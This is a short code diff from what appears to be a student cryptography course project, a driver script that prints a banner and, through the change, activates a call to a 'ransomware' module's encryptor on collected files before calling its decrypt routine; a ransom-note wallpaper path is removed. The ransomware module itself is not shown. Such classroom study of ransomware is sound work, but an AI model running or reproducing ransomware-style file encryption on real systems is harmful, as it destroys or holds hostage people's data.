@@ -26,10 +26,11 @@ print(cl.blue + """
 \t             FC421 CRYPTOGRAPHY PROJECT
 \t            For: Dr.Mohammad Abdulrahman
 """ + cl.green+"\t\t\t\tBY:Renad,Haya,Sondos,Mariam\n")
-
-#wallpaper_path="/home/mariam/Desktop/ransomnote.jpeg"
+#initialize the file lists
 list_f = []
 list_d = []
 print(cl.color+"ENCRYPTING FILES ;(" + cl.end)
-#ransomware.encryptor(ransomware.getFile(list_f))
+#call encryption process
+ransomware.encryptor(ransomware.getFile(list_f))
+#call decryption process
 ransomware.decrypt(ransomware.getFile(list_d))
